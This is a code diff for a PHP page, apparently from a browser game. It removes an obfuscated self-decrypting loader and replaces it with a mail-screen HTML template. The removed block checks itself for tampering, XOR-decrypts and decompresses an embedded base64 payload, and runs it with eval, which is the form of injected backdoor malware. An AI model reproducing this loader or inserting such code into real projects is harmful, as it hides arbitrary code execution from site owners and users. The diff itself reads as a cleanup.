@@ -1,24 +1,52 @@
-<?php
-$racoynu="87bb2efc2c494cfe8770732ea46e2aa2";
-$wokybg="0f565b51010752055057040f0102555308540353510502010751505005045204";
-$jxhofkyd="T7tEZn4N5yZyiWfcSnmf9uoxhOIFLRdzSC1GFJltau3CWedFgAnZCPAi9ElSp73llG1Bxw4JVrr96oHE9Q3INiksoLfLBgTS6gWx4FYyFbM6wuwrC5y9z7e++sP+l8lc5h9jHWVHYDNItsK+A4VfoHd+OelqYPshJ1OxYlPe2ew5FTraKL5Al0upkcH7Buo7aT5rYlu9aovGAkkm0unAASmKYluv79vlnLkHcM9UFQvVg+lw9uFCoCE+jdOBIpeVH441vdOzKzChmrarARte/RTZGlrfLJ69dfH3FKOsfbEzl4O9XvtImpLVlUfasYAB/sBgTsIFngJmfAbjYzNdJv1EFopPRT0pMvpSquu3UHJNZixvrIQs5QdgRJV2cIIgR2J7I+IR1PlMMk5wFT6M0Vdz8Pk0/BmHsyt9FuA9xTcqVwa2nacbhBwDWJRRKI/VOGSHUrzTkffhbxce0g7aIYafZu656bFdKNbgoe4o0v/BJxZ0PmjagCJjCRKVBInFFPeChaaWavSCDd0P+cUCWP9WPDpgSZYFNXgXymqjJc76m8XWdDd1aABMMTMY5v3lIdR0vygnqNK3Y01J40S1wr8ZoINE0/4Ka8FYTDSXHJY5mwtnMpurKmRr04cZM0nlLr2ZVkIEIBogiyzsjVCSdZXGZc6SVxg2EOyayd+gRUOO5D5SD9WtsHaq3hTxxr3wfKfzO7r9rXgo3MOGgxNZ/aYHAPqVHH79z2FhDa5/mGEkk3ldRka6xMLKZYiuPw4G/AEIeHY9tJHkDhCEqd12WRKFRNsHCep5t5TKDHOU6m924EOObcHTwJQ06pj0ONsR/H/a1VcMe2+zxxyNROorttEDVWJIMgBfx4LY9QZPWFWmASoa8GS6rt7lR5N1q3oy6le3q0B69vIfQFHqu13QiMENd5p/glu2sS4XTbs+XHntGOuE1Ld6HALpTdNacX6yBNUOBx+VXVnwVAra2QyBJ6Tt6JSxhaRetz3XA1ct8e4j8e+EoB/5rYKJK3GUmAeIiG3kzB7odXyp30+b7rrE";
-$cblwpo=file_get_contents(__FILE__);
-$ldousf=str_replace($jxhofkyd,"",$cblwpo);
-if(strpos($ldousf,"ec"."ho")!==false||strpos($ldousf,"pr"."int")!==false||strpos($ldousf,"var_"."dump")!==false||strpos($ldousf,"file_put_"."contents")!==false||strpos($ldousf,"fw"."rite")!==false){die();}
-$qknpveq=str_replace(array($racoynu,$wokybg),array("SP_9e1c7dac","KP_5650d35b"),$cblwpo);
-$dthqnwkv=md5($qknpveq);
-$mfjiuleew=hex2bin($wokybg);
-$vocnwx="";
-$cqhyvjx=strlen($dthqnwkv);
-for($idiatgk=0;$idiatgk<$cqhyvjx;$idiatgk++){
-$vocnwx.=chr(ord($mfjiuleew[$idiatgk])^ord($dthqnwkv[$idiatgk]));
-}
-$wlioxbbtpkx=base64_decode($jxhofkyd);
-$jmmzlk=strlen($wlioxbbtpkx);
-$fvpahrrr="";
-$gosgpqn=strlen($vocnwx);
-for($idiatgk=0;$idiatgk<$jmmzlk;$idiatgk++){
-$fvpahrrr.=$wlioxbbtpkx[$idiatgk]^$vocnwx[$idiatgk%$gosgpqn];
-}
-$htzibdbnt="gzun"."compress";
-eval('?>' . $htzibdbnt($fvpahrrr) . '<?php ');
+<link rel="stylesheet" href="/css/mail_modern.css">
+<h2><?= __('screens.mail.title') ?></h2>
+
+<?php if (!empty($error)): ?>
+    <div style="color:red; font-size:large"><?= $error ?></div>
+<?php endif; ?>
+
+<table>
+    <tr>
+        <td valign="top">
+            <table class="vis" width="100">
+                <?php foreach ($links as $f_name => $f_mode): ?>
+                    <tr>
+                        <td class="<?= $mode === $f_mode ? 'selected' : '' ?>" width="120">
+                            <a
+                                href="game.php?village=<?= $village['id'] ?>&screen=mail&mode=<?= $f_mode ?>"><?= $f_name ?></a>
+                        </td>
+                    </tr>
+                <?php endforeach; ?>
+            </table>
+        </td>
+        <td valign="top" width="100%">
+            <?php
+            if (in_array($mode, $allow_mods)) {
+                $viewPath = __DIR__ . '/mail_' . $mode . '.php';
+                if (file_exists($viewPath)) {
+                    include $viewPath;
+                } else {
+                    echo __('screens.mail.mode_not_implemented') . " " . htmlspecialchars($mode);
+                }
+            }
+            ?>
+        </td>
+    </tr>
+</table>
+
+<script type="text/javascript">
+$(document).ready(function() {
+    // Make mail cards clickable
+    $('.mail-list').on('click', '.mail-card', function(e) {
+        // Don't trigger if clicking on links, buttons, checkboxes or their containers
+        if ($(e.target).closest('a, input, button, .mail-actions, .mail-checkbox, .mail-from').length) {
+            return;
+        }
+        
+        var viewLink = $(this).find('.mail-subject').attr('href');
+        if (viewLink) {
+            window.location.href = viewLink;
+        }
+    });
+});
+</script>
